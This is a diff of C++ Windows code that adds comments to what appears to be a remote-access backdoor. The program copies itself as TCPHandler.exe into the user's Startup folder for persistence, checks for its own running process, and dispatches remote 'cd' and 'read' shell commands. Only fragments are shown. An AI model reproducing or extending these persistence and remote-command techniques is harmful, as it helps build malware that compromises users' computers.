@@ -6,6 +6,7 @@
 #include <Windows.h>
 #include <tlhelp32.h>
 
+/* setting the path using appdata and the fixed path to the start menu*/
 std::string startUpPath = std::string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TCPHandler.exe";
 
 uint32_t getPrivateIP()
@@ -27,6 +28,7 @@ bool isRunning()
 
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
 
+    /* passing through all the system32 process and finding*/
     if (Process32First(snapshot, &entry))
         while (Process32Next(snapshot, &entry))
             if (!wcscmp(entry.szExeFile, L"TCPHandler.exe"))
@@ -94,6 +96,7 @@ std::string executeShell(char* cmd)
     std::string cd = std::string(cmd).substr(0, 2);
     if (cd._Equal("cd"))
         return switchDir((char*)std::string(cmd).substr(2).c_str());
+    
     std::string read = std::string(cmd).substr(0, 4);
     if (read == "read")
         return readFile(std::string(cmd).substr(5));
